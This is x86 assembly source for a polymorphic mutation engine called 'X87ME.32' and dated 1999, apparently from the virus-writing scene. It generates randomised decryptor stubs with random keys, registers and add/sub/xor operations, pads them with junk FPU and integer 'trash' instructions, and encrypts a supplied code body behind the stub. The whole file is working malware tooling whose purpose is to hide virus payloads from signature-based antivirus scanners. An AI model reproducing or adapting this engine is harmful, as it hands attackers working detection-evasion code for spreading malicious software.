
;
; [X87ME.32] - (c) 1999, Made in Taiwan.
;
; Usage:
;
;	[Input]
;		ebp = offset where the decryption routine will be executed
;		ebx = buffer where the decryptor will be stored
;		ecx = point to the code which will be encrypted
;		edx = length of the code to encrypt
;
;	[Output]
;		ecx = point to the (decryption routine + encrypted code)
;		edx = length of the (decryption routine + encrypted code)
;

X87ME_Start:

enc_cod	db 10101000b,02h, 10000000b,2ah, 10110000b,32h,	10110000b,32h
;	   sub.......add  add.......sub	 xor.......xor	xor.......xor

reg_cod	db 011b,011b,	  011b,011b,	 110b,110b,	111b,111b
;	   ebx,[ebx+disp] ebx,[ebx+disp] esi,[esi+disp]	edi,[edi+disp]

reg	db 0,0

var1	dd 0	; address of "mov reg,xxxxh"
var2	dd 0	; address of decode restart
var3	dd 0	; address of "xor byte ptr [reg+xxxxh],xxh"
var4	dd 0	; address of "cmp reg,xxxxh"

para_ebp dd 0
para_ebx dd 0
para_ecx dd 0
para_edx dd X87ME_Size

@x	equ $

X87ME:
	push ebp
	
	call x87me_reloc
x87me_reloc:
	pop ebp
	sub ebp,x87me_reloc-@x
	
	pop dword [ebp-@x+para_ebp]
	mov [ebp-@x+para_ebx],ebx
	mov [ebp-@x+para_ecx],ecx
	mov [ebp-@x+para_edx],edx
	
	mov edi,ebx
	xor ebx,ebx	
	
	lea esi,[ebp-@x+reg_cod]	; set the register type
	call rnd_esi
	lodsd
	mov [ebp-@x+reg],ax

	call make_tsh_cod

	mov al,[ebp-@x+reg]
	or al,0b8h			; make "mov reg,xxxxh"
	stosb
	mov [ebp-@x+var1],edi
	stosd

	call make_tsh_cod

	mov [ebp-@x+var2],edi		; save address of decode restart

	call make_tsh_cod

	rdtsc				; make add byte	ptr [reg+disp],xxh
	and al,02h			;      sub byte	ptr [reg+disp],xxh
	add al,80h			;      xor byte	ptr [reg+disp],xxh
	stosb
	lea esi,[ebp-@x+enc_cod]
	call rnd_esi
	lodsd
	mov [ebp-@x+enc_buf],ah
	or al,[ebp-@x+reg+01h]
	stosb
	mov [ebp-@x+var3],edi
	rdtsc				; disp
	stosd
	rdtsc				; encrypt key
	stosb

	call make_tsh_cod

	mov al,40h			; make "inc reg"
	or al,[ebp-@x+reg]
	stosb

	call make_tsh_cod

	mov ax,0f881h			; make "cmp reg,xxxxh"
	or ah,[ebp-@x+reg]
	stosw
	mov [ebp-@x+var4],edi
	stosd

	or bl,10000000b
	call make_tsh_cod
	and bl,00000001b

	mov al,75h			; make "jnz xxxxh"
	stosb
	mov eax,[ebp-@x+var2]
	sub eax,edi
	dec eax
	stosb

	call make_tsh_cod

	mov eax,edi
	sub eax,[ebp-@x+para_ebx]
	add eax,[ebp-@x+para_ebp]
	mov esi,[ebp-@x+var3]
	sub eax,[esi]
	mov dl,[esi+04h]
	mov esi,[ebp-@x+var1]
	mov [esi],eax
	mov [ebp-@x+var1],eax

	mov esi,[ebp-@x+para_ecx]
	mov ecx,[ebp-@x+para_edx]

enc_prg:
	lodsb

enc_buf	db 90h,0c2h

	stosb
	loop enc_prg

	mov esi,[ebp-@x+var4]
	mov eax,[ebp-@x+var1]
	add eax,[ebp-@x+para_edx]
	mov [esi],eax

x87me_ext:
	mov ecx,[ebp-@x+para_ebx]	; set return para.
	mov edx,edi
	sub edx,ecx
	ret

rnd_esi:
	rdtsc
	and eax,byte 03h
	add eax,eax
	add esi,eax
	ret

mtc_tab	dw mtc1-@x,mtc2-@x,mtc3-@x,mtc4-@x

make_tsh_cod:
	push ecx
	rdtsc
	and eax,byte 07h
	inc eax
	xchg eax,ecx
mtc_l:
	rdtsc
	and eax,byte 03h
	test bl,10000000b
	jz rs_a
	and al,01h
rs_a:
	add eax,eax
	lea esi,[ebp-@x+mtc_tab]
	add esi,eax
	movzx esi,word [esi]
	add esi,ebp
	rdtsc
	call esi
	loop mtc_l
	pop ecx
	ret

mtc1:
	and al,00000100b
	or al,0d8h
	stosb
	mov al,ah
	and ah,00000111b
	cmp ah,00000101b
	jnz mtc1_a
	and al,00111111b
	stosb
	xchg eax,edx
	and eax,byte 1fh
	add eax,[ebp-@x+para_ebp]
	stosd
	ret
mtc1_a:
	or al,11000000b
	stosb
	ret		

mtc2:
	and al,01h
	mov dl,al
	shl dl,3
	call rnd_reg
	and al,00000111b
	or al,0b0h
	or al,dl
	stosb
	cmp al,0b8h
	rdtsc
	jb mtc2_a
	stosd
	ret
mtc2_a:
	stosb
	ret

mtc3:
	cmp al,0a0h
	jae mtc3_a3
	cmp al,40h
	jae mtc3_a2
mtc3_a1:
	and al,11111101b
	stosb
	mov ah,al
	and ah,00000100b
	jnz mtc3_a1b1
	call rnd_reg
	stosb
	ret
mtc3_a1b1:
	and al,01h
	rdtsc
	jz mtc3_a1b2
	stosd
	ret
mtc3_a1b2:	
	stosb
	ret

mtc3_a2:
	mov al,01h
	call rnd_reg
	and al,0fh
	or al,40h
	stosb
	ret

cod_tab db 91h,98h,91h,98h,91h,0f8h,0f8h
	db 27h,2fh,37h,3fh,9bh,9fh,90h,0d6h,0f5h

mtc3_a3:
	and eax,byte 0fh
	lea esi,[ebp-@x+cod_tab]
	add esi,eax
	mov ah,[esi]
	cmp al,07h
	jae mtc3_a3b
	and dl,01h
	add ah,dl
mtc3_a3b:
	mov al,ah
	stosb
	ret

mtc4:
	and al,02h
	or al,80h
	stosb
	call rnd_reg
	stosb
	xchg eax,edx
	stosb
	ret

rnd_reg:
	push edx
	mov bh,al
rr_a1:
	rdtsc
	mov ah,al
	test bh,01h
	jnz rr_a2
	and ah,00000011b
rr_a2:
	and ah,00000111b
	cmp ah,00000100b
	jz rr_a1
	cmp ah,00000101b
	jz rr_a1
	cmp ah,[ebp-@x+reg]
	jz rr_a1
	or al,11000000b
	pop edx
	ret

X87ME_End:

X87ME_Size equ X87ME_End - X87ME_Start	; = 527 bytes
